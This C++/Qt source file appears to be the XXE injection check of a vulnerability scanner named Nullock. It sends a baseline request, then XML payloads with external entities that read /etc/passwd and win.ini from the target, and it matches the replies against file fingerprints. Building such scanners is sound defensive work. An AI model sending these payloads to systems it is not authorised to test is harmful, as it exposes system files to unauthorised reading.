#include "xxe_injection.hpp"
#include "networking.hpp"

#include <QRegularExpression>

namespace Nullock::Core::XxeInjection {

namespace {

constexpr int kMaxBody = 512 * 1024;

struct Payload {
    const char *technique;
    const char *target;
    QByteArray  xml;
    QRegularExpression sig;   // content fingerprint of the target file
};

const QList<Payload> &payloads() {
    static const QList<Payload> p = {
        { "file-passwd", "/etc/passwd",
          "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
          "<!DOCTYPE r [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>"
          "<r>&xxe;</r>",
          QRegularExpression("root:[^:\\n]*:0:0:[^:\\n]*:[^:\\n]*:") },
        { "file-winini", "c:/windows/win.ini",
          "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
          "<!DOCTYPE r [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]>"
          "<r>&xxe;</r>",
          QRegularExpression("\\[(?:fonts|extensions|mci extensions)\\]",
                             QRegularExpression::CaseInsensitiveOption) },
    };
    return p;
}

QString matchSig(const QRegularExpression &re, const QByteArray &body) {
    const auto m = re.match(QString::fromUtf8(body.left(kMaxBody)));
    return m.hasMatch() ? m.captured(0) : QString();
}

QByteArray buildRequest(const Request &req, const QByteArray &body) {
    const QString path = req.basePath.isEmpty() ? QStringLiteral("/") : req.basePath;
    const QString ct = req.contentType.isEmpty() ? QStringLiteral("application/xml")
                                                 : req.contentType;
    QByteArray out;
    out  = req.method.toUtf8() + " " + path.toUtf8() + " HTTP/1.1\r\n";
    out += "Host: " + req.host.toUtf8() + "\r\n";
    out += "User-Agent: Nullock/xxe\r\n";
    out += "Accept: */*\r\n";
    out += "Accept-Encoding: identity\r\n";
    out += "Content-Type: " + ct.toUtf8() + "\r\n";
    for (const auto &h : req.headers) {
        if (h.first.compare("Host", Qt::CaseInsensitive) == 0) continue;
        if (h.first.compare("Content-Length", Qt::CaseInsensitive) == 0) continue;
        if (h.first.compare("Content-Type", Qt::CaseInsensitive) == 0) continue;
        if (h.first.contains('\r') || h.first.contains('\n')) continue;
        if (h.second.contains('\r') || h.second.contains('\n')) continue;
        out += h.first.toUtf8() + ": " + h.second.toUtf8() + "\r\n";
    }
    out += "Content-Length: " + QByteArray::number(body.size()) + "\r\n";
    out += "Connection: close\r\n\r\n";
    out += body;
    return out;
}

} // namespace

Result test(const Request &req) {
    Result result;
    if (req.host.isEmpty()) { result.error = "host required"; return result; }

    HttpClient client;
    const quint16 port = static_cast<quint16>(req.port);
    auto send = [&](const QByteArray &body) {
        ++result.requestsSent;
        return client.send(req.host, port, req.tls, buildRequest(req, body));
    };

    // Benign baseline XML: if a signature is already present here, we can't
    // attribute it to our entity.
    const auto base = send("<?xml version=\"1.0\"?><r>nullock</r>");
    if (!base.ok) { result.error = "baseline failed: " + base.errorMessage; return result; }
    result.baselineStatus = base.parsed.statusCode;

    for (const Payload &p : payloads()) {
        if (!matchSig(p.sig, base.parsed.body).isEmpty()) continue;   // present at baseline
        const auto r = send(p.xml);
        if (!r.ok) continue;
        const QString sig = matchSig(p.sig, r.parsed.body);
        if (!sig.isEmpty()) {
            result.hits.append({ QString::fromUtf8(p.technique),
                                 QString::fromUtf8(p.target), sig });
            result.vulnerable = true;
        }
    }

    return result;
}

} // namespace Nullock::Core::XxeInjection
